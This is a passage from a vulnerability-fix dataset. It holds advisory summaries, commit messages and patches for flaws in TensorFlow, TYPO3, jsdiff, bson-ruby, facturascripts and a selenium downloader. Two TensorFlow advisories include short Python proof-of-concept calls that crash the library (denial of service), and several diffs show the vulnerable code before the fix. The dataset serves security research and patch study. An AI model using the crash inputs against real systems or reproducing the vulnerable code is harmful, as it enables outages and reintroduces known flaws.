getMajorMinorVersion(SELENIUM_BINARIES_SERVER_STANDALONE_VERSION)\\n       ),\\n       path: path.resolve(\\n@@ -55,7 +55,7 @@ module.exports = {\\n     chromedriver: {\\n       version: SELENIUM_BINARIES_CHROMEDRIVER_VERSION,\\n       url: util.format(\\n-        'http:\/\/chromedriver.storage.googleapis.com\/%s\/',\\n+        'https:\/\/chromedriver.storage.googleapis.com\/%s\/',\\n         SELENIUM_BINARIES_CHROMEDRIVER_VERSION\\n       ),\\n       path: path.resolve(\\n@@ -89,7 +89,7 @@ module.exports = {\\n     iedriver: {\\n       version: SELENIUM_BINARIES_IEDRIVER_VERSION,\\n       url: util.format(\\n-        'http:\/\/selenium-release.storage.googleapis.com\/%s\/',\\n+        'https:\/\/selenium-release.storage.googleapis.com\/%s\/',\\n         getMajorMinorVersion(SELENIUM_BINARIES_IEDRIVER_VERSION)\\n       ),\\n       path: path.resolve(\"}}","message_norm":"avoid mitm by downloading through https (#33)\n\nco-authored-by: alejandro romero herrera <alromh87@gmail.com>\r\nco-authored-by: raj <70631238+418raj@users.noreply.github.com>","language":"en","entities":"[('mitm', 'SECWORD', ''), ('#33', 'ISSUE', ''), ('alromh87@gmail.com', 'EMAIL', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['lib\/config.js'])","num_files":1.0},{"index":1988,"vuln_id":"GHSA-h4mx-xv96-2jgm","cwe_id":"{'CWE-79'}","score":5.4,"chain":"{'https:\/\/github.com\/TYPO3\/typo3\/commit\/da611775f92102d7602713003f4c79606c8a445d'}","dataset":"osv","summary":"Cross-Site Scripting in TYPO3's Frontend Login Mailer > ### Meta\n> * CVSS: `CVSS:3.1\/AV:N\/AC:L\/PR:L\/UI:R\/S:C\/C:L\/I:L\/A:N\/E:F\/RL:O\/RC:C` (4.9)\n\n### Problem\nUser submitted content was used without being properly encoded in HTML emails sent to users. The actually affected components were mail clients used to view those messages.\n\n### Solution\nUpdate to TYPO3 versions 9.5.35 ELTS, 10.4.29, 11.5.11 that fix the problem described above.\n\n### Credits\nThanks to Christian Seifert who reported this issue and to TYPO3 framework merger Andreas Fernandez who fixed the issue.\n\n### References\n* [TYPO3-CORE-SA-2022-004](https:\/\/typo3.org\/security\/advisory\/typo3-core-sa-2022-004)","published_date":"2022-06-17","chain_len":1,"project":"https:\/\/github.com\/TYPO3\/typo3","commit_href":"https:\/\/github.com\/TYPO3\/typo3\/commit\/da611775f92102d7602713003f4c79606c8a445d","commit_sha":"da611775f92102d7602713003f4c79606c8a445d","patch":"SINGLE","chain_ord":"['da611775f92102d7602713003f4c79606c8a445d']","before_first_fix_commit":"{'6f2554dc4ea0b670fd5599c54fd788d4db96c4a0'}","last_fix_commit":"da611775f92102d7602713003f4c79606c8a445d","chain_ord_pos":1.0,"commit_datetime":"06\/14\/2022, 07:18:04","message":"[SECURITY] Avoid HTML injection in password recovery mail\n\nThe `receiverName` variable used in the password recovery mail of the\nExtbase felogin plugin was susceptible to HTML injection due to\nmissing sanitization. The variable is now passed thru the\n`f:format.htmlspecialchars` ViewHelper.\n\nResolves: #96559\nReleases: main, 11.5, 10.4\nChange-Id: I60e23c161f7f2fcc87b8870345b10a4c31d7b8db\nSecurity-Bulletin: TYPO3-CORE-SA-2022-004\nSecurity-References: CVE-2022-31049\nReviewed-on: https:\/\/review.typo3.org\/c\/Packages\/TYPO3.CMS\/+\/74904\nTested-by: Oliver Hader <oliver.hader@typo3.org>\nReviewed-by: Oliver Hader <oliver.hader@typo3.org>","author":"Andreas Fernandez","comments":null,"stats":"{'additions': 1, 'deletions': 1, 'total': 2}","files":"{'typo3\/sysext\/felogin\/Resources\/Private\/Email\/Templates\/PasswordRecovery.html': {'additions': 1, 'deletions': 1, 'changes': 2, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/TYPO3\/typo3\/raw\/da611775f92102d7602713003f4c79606c8a445d\/typo3%2Fsysext%2Ffelogin%2FResources%2FPrivate%2FEmail%2FTemplates%2FPasswordRecovery.html', 'patch': '@@ -9,7 +9,7 @@\\n         {f:translate(\\n         key: \\'forgot_validate_reset_password_html\\',\\n         extensionName: \\'felogin\\',\\n-        arguments: \\'{ 0: receiverName, 1: recoveryLink, 2: validUntil }\\'\\n+        arguments: \\'{ 0: \"{receiverName -> f:format.htmlspecialchars()}\", 1: recoveryLink, 2: validUntil }\\'\\n         ) -> f:format.html()}\\n     <\/f:spaceless>\\n <\/f:section>'}}","message_norm":"[security] avoid html injection in password recovery mail\n\nthe `receivername` variable used in the password recovery mail of the\nextbase felogin plugin was susceptible to html injection due to\nmissing sanitization. the variable is now passed thru the\n`f:format.htmlspecialchars` viewhelper.\n\nresolves: #96559\nreleases: main, 11.5, 10.4\nchange-id: i60e23c161f7f2fcc87b8870345b10a4c31d7b8db\nsecurity-bulletin: typo3-core-sa-2022-004\nsecurity-references: cve-2022-31049\nreviewed-on: https:\/\/review.typo3.org\/c\/packages\/typo3.cms\/+\/74904\ntested-by: oliver hader <oliver.hader@typo3.org>\nreviewed-by: oliver hader <oliver.hader@typo3.org>","language":"en","entities":"[('security', 'SECWORD', ''), ('injection', 'SECWORD', ''), ('password', 'SECWORD', ''), ('password', 'SECWORD', ''), ('injection', 'SECWORD', ''), ('sanitization', 'SECWORD', ''), ('format.htmlspecialchars', 'SECWORD', ''), ('#96559', 'ISSUE', ''), ('security', 'SECWORD', ''), ('security', 'SECWORD', ''), ('cve-2022-31049', 'VULNID', 'CVE'), ('https:\/\/review.typo3.org\/c\/packages\/typo3.cms\/+\/74904', 'URL', ''), ('oliver.hader@typo3.org', 'EMAIL', ''), ('oliver.hader@typo3.org', 'EMAIL', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['typo3\/sysext\/felogin\/Resources\/Private\/Email\/Templates\/PasswordRecovery.html'])","num_files":1.0},{"index":1989,"vuln_id":"GHSA-h4pc-gx2w-f2xv","cwe_id":"{'CWE-125'}","score":7.1,"chain":"{'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/ae2daeb45abfe2c6dda539cf8d0d6f653d3ef412'}","dataset":"osv","summary":"Heap OOB read in TFLite ### Impact\nA specially crafted TFLite model could trigger an OOB read on heap in the TFLite implementation of [`Split_V`](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/c59c37e7b2d563967da813fa50fe20b21f4da683\/tensorflow\/lite\/kernels\/split_v.cc#L99):\n\n```cc\nconst int input_size = SizeOfDimension(input, axis_value);\n``` \n\nIf `axis_value` is not a value between 0 and `NumDimensions(input)`, then the [`SizeOfDimension` function](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/102b211d892f3abc14f845a72047809b39cc65ab\/tensorflow\/lite\/kernels\/kernel_util.h#L148-L150) will access data outside the bounds of the tensor shape array:\n\n```cc\ninline int SizeOfDimension(const TfLiteTensor* t, int dim) {\n  return t->dims->data[dim];\n}\n```\n  \n### Patches \nWe have patched the issue in GitHub commit [ae2daeb45abfe2c6dda539cf8d0d6f653d3ef412](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/ae2daeb45abfe2c6dda539cf8d0d6f653d3ef412).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/master\/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by members of the Aivul Team from Qihoo 360.","published_date":"2021-05-21","chain_len":1,"project":"https:\/\/github.com\/tensorflow\/tensorflow","commit_href":"https:\/\/github.com\/tensorflow\/tensorflow\/commit\/ae2daeb45abfe2c6dda539cf8d0d6f653d3ef412","commit_sha":"ae2daeb45abfe2c6dda539cf8d0d6f653d3ef412","patch":"SINGLE","chain_ord":"['ae2daeb45abfe2c6dda539cf8d0d6f653d3ef412']","before_first_fix_commit":"{'c59c37e7b2d563967da813fa50fe20b21f4da683'}","last_fix_commit":"ae2daeb45abfe2c6dda539cf8d0d6f653d3ef412","chain_ord_pos":1.0,"commit_datetime":"04\/29\/2021, 01:12:15","message":"Prevent array OOB read\/write\n\nPiperOrigin-RevId: 371026165\nChange-Id: I26ac6372c87246e03c7eb8c94e84c84d86054b36","author":"Mihai Maruseac","comments":null,"stats":"{'additions': 2, 'deletions': 0, 'total': 2}","files":"{'tensorflow\/lite\/kernels\/split_v.cc': {'additions': 2, 'deletions': 0, 'changes': 2, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/tensorflow\/tensorflow\/raw\/ae2daeb45abfe2c6dda539cf8d0d6f653d3ef412\/tensorflow%2Flite%2Fkernels%2Fsplit_v.cc', 'patch': '@@ -96,6 +96,8 @@ TfLiteStatus ResizeOutputTensors(TfLiteContext* context, TfLiteNode* node,\\n     }\\n   }\\n \\n+  TF_LITE_ENSURE(context, axis_value >= 0);\\n+  TF_LITE_ENSURE(context, axis_value < NumDimensions(input));\\n   const int input_size = SizeOfDimension(input, axis_value);\\n \\n   if (minus_one_index != -1) {'}}","message_norm":"prevent array oob read\/write\n\npiperorigin-revid: 371026165\nchange-id: i26ac6372c87246e03c7eb8c94e84c84d86054b36","language":"en","entities":"[('prevent', 'ACTION', ''), ('oob', 'SECWORD', ''), ('371026165', 'SHA', 'generic_sha')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['tensorflow\/lite\/kernels\/split_v.cc'])","num_files":1.0},{"index":1995,"vuln_id":"GHSA-h5g4-ppwx-48q2","cwe_id":"{'CWE-20'}","score":5.5,"chain":"{'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/cff267650c6a1b266e4b4500f69fbc49cdd773c5'}","dataset":"osv","summary":"Missing validation causes denial of service via `DeleteSessionTensor` ### Impact\nThe implementation of [`tf.raw_ops.DeleteSessionTensor`](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/f3b9bf4c3c0597563b289c0512e98d4ce81f886e\/tensorflow\/core\/kernels\/session_ops.cc#L128-L144) does not fully validate the input arguments. This results in a `CHECK`-failure which can be used to trigger a denial of service attack:\n\n```python\nimport tensorflow as tf\n\nhandle = tf.constant(\"[]\", shape=[0], dtype=tf.string)\ntf.raw_ops.DeleteSessionTensor(handle=handle)\n```\n  \nThe code assumes `handle` is a scalar but there is no validation for this:\n  \n```cc\n    const Tensor& handle = ctx->input(0);\n    const string& name = handle.scalar<tstring>()();\n```\n\n### Patches\nWe have patched the issue in GitHub commit [cff267650c6a1b266e4b4500f69fbc49cdd773c5](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/cff267650c6a1b266e4b4500f69fbc49cdd773c5).\n\nThe fix will be included in TensorFlow 2.9.0. We will also cherrypick this commit on TensorFlow 2.8.1, TensorFlow 2.7.2, and TensorFlow 2.6.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/master\/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Neophytos Christou from Secure Systems Lab at Brown University.","published_date":"2022-05-24","chain_len":1,"project":"https:\/\/github.com\/tensorflow\/tensorflow","commit_href":"https:\/\/github.com\/tensorflow\/tensorflow\/commit\/cff267650c6a1b266e4b4500f69fbc49cdd773c5","commit_sha":"cff267650c6a1b266e4b4500f69fbc49cdd773c5","patch":"SINGLE","chain_ord":"['cff267650c6a1b266e4b4500f69fbc49cdd773c5']","before_first_fix_commit":"{'339d5de981acaa8580da62c5de8c0da64ae88ad4'}","last_fix_commit":"cff267650c6a1b266e4b4500f69fbc49cdd773c5","chain_ord_pos":1.0,"commit_datetime":"04\/28\/2022, 20:08:57","message":"Fix tf.raw_ops.DeleteSessionTensor vulnerability with invalid `handle`.\n\nCheck that `handle` input is actually a scalar before treating it as such.\n\nPiperOrigin-RevId: 445228994","author":"Alan Liu","comments":null,"stats":"{'additions': 2, 'deletions': 0, 'total': 2}","files":"{'tensorflow\/core\/kernels\/session_ops.cc': {'additions': 2, 'deletions': 0, 'changes': 2, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/tensorflow\/tensorflow\/raw\/cff267650c6a1b266e4b4500f69fbc49cdd773c5\/tensorflow%2Fcore%2Fkernels%2Fsession_ops.cc', 'patch': '@@ -134,6 +134,8 @@ class DeleteSessionTensorOp : public OpKernel {\\n \\n   void Compute(OpKernelContext* ctx) override {\\n     const Tensor& handle = ctx->input(0);\\n+    OP_REQUIRES(ctx, TensorShapeUtils::IsScalar(handle.shape()),\\n+                errors::InvalidArgument(\"`handle` must be scalar\"));\\n     const string& name = handle.scalar<tstring>()();\\n     auto session_state = ctx->session_state();\\n     OP_REQUIRES(ctx, session_state != nullptr,'}}","message_norm":"fix tf.raw_ops.deletesessiontensor vulnerability with invalid `handle`.\n\ncheck that `handle` input is actually a scalar before treating it as such.\n\npiperorigin-revid: 445228994","language":"en","entities":"[('fix', 'ACTION', ''), ('vulnerability', 'SECWORD', ''), ('445228994', 'SHA', 'generic_sha')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['tensorflow\/core\/kernels\/session_ops.cc'])","num_files":1.0},{"index":1999,"vuln_id":"GHSA-h6ch-v84p-w6p9","cwe_id":"{'CWE-400'}","score":0.0,"chain":"{'https:\/\/github.com\/kpdecker\/jsdiff\/commit\/2aec4298639bf30fb88a00b356bf404d3551b8c0'}","dataset":"osv","summary":"Regular Expression Denial of Service (ReDoS) A vulnerability was found in diff before v3.5.0, the affected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) attacks.","published_date":"2019-06-13","chain_len":1,"project":"https:\/\/github.com\/kpdecker\/jsdiff","commit_href":"https:\/\/github.com\/kpdecker\/jsdiff\/commit\/2aec4298639bf30fb88a00b356bf404d3551b8c0","commit_sha":"2aec4298639bf30fb88a00b356bf404d3551b8c0","patch":"SINGLE","chain_ord":"['2aec4298639bf30fb88a00b356bf404d3551b8c0']","before_first_fix_commit":"{'a47aca9cb199d558e02ce406e9838356803e204f'}","last_fix_commit":"2aec4298639bf30fb88a00b356bf404d3551b8c0","chain_ord_pos":1.0,"commit_datetime":"03\/05\/2018, 04:00:42","message":"Optimize parch header parser","author":"Kevin Decker","comments":"{'com_1': {'author': 'mariosanchezgarcia', 'datetime': '07\/30\/2019, 17:32:24', 'body': 'Mario'}}","stats":"{'additions': 4, 'deletions': 4, 'total': 8}","files":"{'src\/patch\/parse.js': {'additions': 4, 'deletions': 4, 'changes': 8, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/kpdecker\/jsdiff\/raw\/2aec4298639bf30fb88a00b356bf404d3551b8c0\/src%2Fpatch%2Fparse.js', 'patch': '@@ -53,16 +53,16 @@ export function parsePatch(uniDiff, options = {}) {\\n   \/\/ Parses the --- and +++ headers, if none are found, no lines\\n   \/\/ are consumed.\\n   function parseFileHeader(index) {\\n-    const headerPattern = \/^(---|\\\\+\\\\+\\\\+)\\\\s+([\\\\S ]*)(?:\\\\t(.*?)\\\\s*)?$\/;\\n-    const fileHeader = headerPattern.exec(diffstr[i]);\\n+    const fileHeader = (\/^(---|\\\\+\\\\+\\\\+)\\\\s+(.*)$\/).exec(diffstr[i]);\\n     if (fileHeader) {\\n       let keyPrefix = fileHeader[1] === \\'---\\' ? \\'old\\' : \\'new\\';\\n-      let fileName = fileHeader[2].replace(\/\\\\\\\\\\\\\\\\\/g, \\'\\\\\\\\\\');\\n+      const data = fileHeader[2].split(\\'\\\\t\\', 2);\\n+      let fileName = data[0].replace(\/\\\\\\\\\\\\\\\\\/g, \\'\\\\\\\\\\');\\n       if (\/^\".*\"$\/.test(fileName)) {\\n         fileName = fileName.substr(1, fileName.length - 2);\\n       }\\n       index[keyPrefix + \\'FileName\\'] = fileName;\\n-      index[keyPrefix + \\'Header\\'] = fileHeader[3];\\n+      index[keyPrefix + \\'Header\\'] = (data[1] || \\'\\').trim();\\n \\n       i++;\\n     }'}}","message_norm":"optimize parch header parser","language":"en","entities":"[('optimize', 'ACTION', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['src\/patch\/parse.js'])","num_files":1.0},{"index":2001,"vuln_id":"GHSA-h6fg-mjxg-hqq4","cwe_id":"{'CWE-197', 'CWE-754'}","score":9.0,"chain":"{'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/ca8c013b5e97b1373b3bb1c97ea655e69f31a575', 'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/27b417360cbd671ef55915e4bb6bb06af8b8a832'}","dataset":"osv","summary":"Integer truncation in Shard API usage ### Impact\nThe `Shard` API in TensorFlow expects the last argument to be a function taking two `int64` (i.e., `long long`) arguments:\nhttps:\/\/github.com\/tensorflow\/tensorflow\/blob\/0e68f4d3295eb0281a517c3662f6698992b7b2cf\/tensorflow\/core\/util\/work_sharder.h#L59-L60\n\nHowever, there are several places in TensorFlow where a lambda taking `int` or `int32` arguments is being used:\nhttps:\/\/github.com\/tensorflow\/tensorflow\/blob\/0e68f4d3295eb0281a517c3662f6698992b7b2cf\/tensorflow\/core\/kernels\/random_op.cc#L204-L205\nhttps:\/\/github.com\/tensorflow\/tensorflow\/blob\/0e68f4d3295eb0281a517c3662f6698992b7b2cf\/tensorflow\/core\/kernels\/random_op.cc#L317-L318\n\nIn these cases, if the amount of work to be parallelized is large enough, integer truncation occurs. Depending on how the two arguments of the lambda are used, this can result in segfaults, read\/write outside of heap allocated arrays, stack overflows, or data corruption.\n\n### Patches\nWe have patched the issue in 27b417360cbd671ef55915e4bb6bb06af8b8a832 and ca8c013b5e97b1373b3bb1c97ea655e69f31a575. We will release patch releases for all versions between 1.15 and 2.3.\n\nWe recommend users to upgrade to TensorFlow 1.15.4, 2.0.3, 2.1.2, 2.2.1, or 2.3.1.\n\n### For more information\nPlease consult [our security guide](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/master\/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by members of the Aivul Team from Qihoo 360.","published_date":"2020-09-25","chain_len":2,"project":"https:\/\/github.com\/tensorflow\/tensorflow","commit_href":"https:\/\/github.com\/tensorflow\/tensorflow\/commit\/27b417360cbd671ef55915e4bb6bb06af8b8a832","commit_sha":"27b417360cbd671ef55915e4bb6bb06af8b8a832","patch":"MULTI","chain_ord":"['27b417360cbd671ef55915e4bb6bb06af8b8a832', 'ca8c013b5e97b1373b3bb1c97ea655e69f31a575']","before_first_fix_commit":"{'b9465214656c42204d86945eca80d211f50043a1'}","last_fix_commit":"ca8c013b5e97b1373b3bb1c97ea655e69f31a575","chain_ord_pos":1.0,"commit_datetime":"09\/19\/2020, 00:21:24","message":"Prevent `int64` to `int` truncation in `Shard` API usage.\n\nThe function argument in `Shard` must be a function of two `int64` arguments. However, we are passing in a function with two `int` arguments. Thus, for large workloads, these arguments get truncated from positive `int64` values to negative `int` ones, resulting in a buffer out of bounds write.\n\nPiperOrigin-RevId: 332557334\nChange-Id: I236c9a2e7f53580e520571da8ba941a3aa9fa0b5","author":"Mihai Maruseac","comments":null,"stats":"{'additions': 1, 'deletions': 1, 'total': 2}","files":"{'tensorflow\/core\/kernels\/random_op.cc': {'additions': 1, 'deletions': 1, 'changes': 2, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/tensorflow\/tensorflow\/raw\/27b417360cbd671ef55915e4bb6bb06af8b8a832\/tensorflow%2Fcore%2Fkernels%2Frandom_op.cc', 'patch': '@@ -202,7 +202,7 @@ class RandomGammaOp : public OpKernel {\\n     \/\/ avoid a couple flops which can be done on a per-alpha basis.\\n \\n     auto DoWork = [samples_per_alpha, num_alphas, &rng, samples_flat,\\n-                   alpha_flat](int start_output, int limit_output) {\\n+                   alpha_flat](int64 start_output, int64 limit_output) {\\n       using Eigen::numext::exp;\\n       using Eigen::numext::log;\\n       using Eigen::numext::log1p;'}}","message_norm":"prevent `int64` to `int` truncation in `shard` api usage.\n\nthe function argument in `shard` must be a function of two `int64` arguments. however, we are passing in a function with two `int` arguments. thus, for large workloads, these arguments get truncated from positive `int64` values to negative `int` ones, resulting in a buffer out of bounds write.\n\npiperorigin-revid: 332557334\nchange-id: i236c9a2e7f53580e520571da8ba941a3aa9fa0b5","language":"en","entities":"[('prevent', 'ACTION', ''), ('out of bounds write', 'SECWORD', ''), ('332557334', 'SHA', 'generic_sha')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['tensorflow\/core\/kernels\/random_op.cc'])","num_files":1.0},{"index":2004,"vuln_id":"GHSA-h6jh-7gv5-28vg","cwe_id":"{'CWE-681'}","score":5.5,"chain":"{'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/c283e542a3f422420cfdb332414543b62fc4e4a5'}","dataset":"osv","summary":"Bad alloc in `StringNGrams` caused by integer conversion ### Impact\nThe implementation of `tf.raw_ops.StringNGrams` is vulnerable to an integer overflow issue caused by converting a signed integer value to an unsigned one and then allocating memory based on this value.\n\n```python\nimport tensorflow as tf\n\ntf.raw_ops.StringNGrams(\n  data=['',''],\n  data_splits=[0,2],\n  separator=' '*100,\n  ngram_widths=[-80,0,0,-60],\n  left_pad=' ',\n  right_pad=' ',\n  pad_width=100,\n  preserve_short_sequences=False)\n```\n\nThe [implementation](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/8d72537c6abf5a44103b57b9c2e22c14f5f49698\/tensorflow\/core\/kernels\/string_ngrams_op.cc#L184) calls `reserve` on a `tstring` with a value that sometimes can be negative if user supplies negative `ngram_widths`. The `reserve` method calls `TF_TString_Reserve` which has an `unsigned long` argument for the size of the buffer. Hence, the implicit conversion transforms the negative value to a large integer.\n\n### Patches\nWe have patched the issue in GitHub commit [c283e542a3f422420cfdb332414543b62fc4e4a5](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/c283e542a3f422420cfdb332414543b62fc4e4a5).\n\nThe fix will be included in TensorFlow 2.6.0. We will also cherrypick this commit on TensorFlow 2.5.1, TensorFlow 2.4.3, and TensorFlow 2.3.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/master\/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by members of the Aivul Team from Qihoo 360.","published_date":"2021-08-25","chain_len":1,"project":"https:\/\/github.com\/tensorflow\/tensorflow","commit_href":"https:\/\/github.com\/tensorflow\/tensorflow\/commit\/c283e542a3f422420cfdb332414543b62fc4e4a5","commit_sha":"c283e542a3f422420cfdb332414543b62fc4e4a5","patch":"SINGLE","chain_ord":"['c283e542a3f422420cfdb332414543b62fc4e4a5']","before_first_fix_commit":"{'9659aea5b5e9de3b417413f69e58dab7a2907912'}","last_fix_commit":"c283e542a3f422420cfdb332414543b62fc4e4a5","chain_ord_pos":1.0,"commit_datetime":"07\/27\/2021, 17:55:35","message":"Disallow negative ngram_widths values in tf.raw_ops.StringNGrams\n\nPiperOrigin-RevId: 387148179\nChange-Id: I641395a09a208be72ef9b3ceb128cf8a83a0775b","author":"Laura Pak","comments":null,"stats":"{'additions': 6, 'deletions': 0, 'total': 6}","files":"{'tensorflow\/core\/kernels\/string_ngrams_op.cc': {'additions': 6, 'deletions': 0, 'changes': 6, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/tensorflow\/tensorflow\/raw\/c283e542a3f422420cfdb332414543b62fc4e4a5\/tensorflow%2Fcore%2Fkernels%2Fstring_ngrams_op.cc', 'patch': '@@ -53,6 +53,12 @@ class StringNGramsOp : public tensorflow::OpKernel {\\n   }\\n \\n   void Compute(tensorflow::OpKernelContext* context) override {\\n+    for (int ngram_width : ngram_widths_) {\\n+      OP_REQUIRES(\\n+          context, ngram_width > 0,\\n+          errors::InvalidArgument(\"ngram_widths must contain positive values\"));\\n+    }\\n+\\n     const tensorflow::Tensor* data;\\n     OP_REQUIRES_OK(context, context->input(\"data\", &data));\\n     const auto& input_data = data->flat<tstring>().data();'}}","message_norm":"disallow negative ngram_widths values in tf.raw_ops.stringngrams\n\npiperorigin-revid: 387148179\nchange-id: i641395a09a208be72ef9b3ceb128cf8a83a0775b","language":"en","entities":"[('387148179', 'SHA', 'generic_sha')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['tensorflow\/core\/kernels\/string_ngrams_op.cc'])","num_files":1.0},{"index":2007,"vuln_id":"GHSA-h6rj-8r3c-9gpj","cwe_id":"{'CWE-400'}","score":9.8,"chain":"{'https:\/\/github.com\/mongodb\/bson-ruby\/commit\/976da329ff03ecdfca3030eb6efe3c85e6db9999'}","dataset":"osv","summary":"bson is vulnerable to denial of service due to incorrect regex validation BSON injection vulnerability in the legal? function in BSON (bson-ruby) gem before 3.0.4 for Ruby allows remote attackers to cause a denial of service (resource consumption) or inject arbitrary data via a crafted string.","published_date":"2018-03-05","chain_len":1,"project":"https:\/\/github.com\/mongodb\/bson-ruby","commit_href":"https:\/\/github.com\/mongodb\/bson-ruby\/commit\/976da329ff03ecdfca3030eb6efe3c85e6db9999","commit_sha":"976da329ff03ecdfca3030eb6efe3c85e6db9999","patch":"SINGLE","chain_ord":"['976da329ff03ecdfca3030eb6efe3c85e6db9999']","before_first_fix_commit":"{'7446d7c6764dfda8dc4480ce16d5c023e74be5ca'}","last_fix_commit":"976da329ff03ecdfca3030eb6efe3c85e6db9999","chain_ord_pos":1.0,"commit_datetime":"06\/04\/2015, 04:19:42","message":"Use \\A \\z for checking regex on legal","author":"Durran Jordan","comments":"{'com_1': {'author': 'judofyr', 'datetime': '06\/04\/2015, 16:53:06', 'body': 'Yay! Thanks for a quick patch.'}, 'com_2': {'author': 'cheald', 'datetime': '06\/04\/2015, 19:17:08', 'body': \"Is the 1.x series going to see a patch? Users who aren't using bson_ext (such as users on JRuby) are still vulnerable.\"}, 'com_3': {'author': 'estolfo', 'datetime': '06\/04\/2015, 19:19:06', 'body': 'Yes, it will be released this afternoon.'}, 'com_4': {'author': 'estolfo', 'datetime': '06\/04\/2015, 19:20:30', 'body': \"It's in master already.\"}, 'com_5': {'author': 'cheald', 'datetime': '06\/04\/2015, 19:21:58', 'body': 'Perfect, thanks. https:\/\/github.com\/mongodb\/mongo-ruby-driver\/blob\/1.x-stable\/lib\/bson\/types\/object_id.rb for anyone else who ends up here looking for it, like me. :)'}, 'com_6': {'author': 'estolfo', 'datetime': '06\/04\/2015, 20:44:37', 'body': 'mongo 1.12.3 and bson 1.12.3 are released with this fix.'}}","stats":"{'additions': 1, 'deletions': 1, 'total': 2}","files":"{'lib\/bson\/object_id.rb': {'additions': 1, 'deletions': 1, 'changes': 2, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/mongodb\/bson-ruby\/raw\/976da329ff03ecdfca3030eb6efe3c85e6db9999\/lib%2Fbson%2Fobject_id.rb', 'patch': '@@ -282,7 +282,7 @@ def from_time(time, options = {})\\n       #\\n       # @since 2.0.0\\n       def legal?(string)\\n-        string.to_s =~ \/^[0-9a-f]{24}$\/i ? true : false\\n+        string.to_s =~ \/\\\\A[0-9a-f]{24}\\\\z\/i ? true : false\\n       end\\n \\n       # Executes the provided block only if the size of the provided object is'}}","message_norm":"use \\a \\z for checking regex on legal","language":"en","entities":null,"classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['lib\/bson\/object_id.rb'])","num_files":1.0},{"index":2009,"vuln_id":"GHSA-h6wm-mr85-4h9g","cwe_id":"{'CWE-79'}","score":6.1,"chain":"{'https:\/\/github.com\/neorazorx\/facturascripts\/commit\/73a6595ca85984d65f656c6356fabb23d1936c54'}","dataset":"osv","summary":"Cross site scripting in facturascripts A Cross-site Scripting (XSS) vulnerability exists in the fsNick parameter in facturascripts prior to version 2022.06","published_date":"2022-06-14","chain_len":1,"project":"https:\/\/github.com\/neorazorx\/facturascripts","commit_href":"https:\/\/github.com\/neorazorx\/facturascripts\/commit\/73a6595ca85984d65f656c6356fabb23d1936c54","commit_sha":"73a6595ca85984d65f656c6356fabb23d1936c54","patch":"SINGLE","chain_ord":"['73a6595ca85984d65f656c6356fabb23d1936c54']","before_first_fix_commit":"{'298eb4b1a94c5898fde5a21e412955fc77a3ef93'}","last_fix_commit":"73a6595ca85984d65f656c6356fabb23d1936c54","chain_ord_pos":1.0,"commit_datetime":"04\/28\/2022, 09:29:31","message":"Sanitized username when showing user not found message.\n------\nSaneado nombre de usuario al mostrar el mensaje de usuario no encontrado.","author":"Carlos Garcia Gomez","comments":null,"stats":"{'additions': 1, 'deletions': 1, 'total': 2}","files":"{'Core\/App\/AppController.php': {'additions': 1, 'deletions': 1, 'changes': 2, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/NeoRazorX\/facturascripts\/raw\/73a6595ca85984d65f656c6356fabb23d1936c54\/Core%2FApp%2FAppController.php', 'patch': \"@@ -287,7 +287,7 @@ private function userAuth()\\n         }\\n \\n         $this->ipWarning();\\n-        ToolBox::i18nLog()->warning('login-user-not-found', ['%nick%' => $nick]);\\n+        ToolBox::i18nLog()->warning('login-user-not-found', ['%nick%' => htmlspecialchars($nick)]);\\n         return false;\\n     }\"}}","message_norm":"sanitized username when showing user not found message.\n------\nsaneado nombre de usuario al mostrar el mensaje de usuario no encontrado.","language":"en","entities":"[('sanitized', 'SECWORD', ''), ('found', 'ACTION', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['Core\/App\/AppController.php'])","num_files":1.0},{"index":2011,"vuln_id":"GHSA-h6xx-pmxh-3wgp","cwe_id":"{'CWE-285', 'CWE-287'}","score":8.1,"chain":"{'https:\/\/github.com\/etcd-io\/etcd\/commit\/bf9d0d8291dc71ecbfb2690612954e1a298154b2', 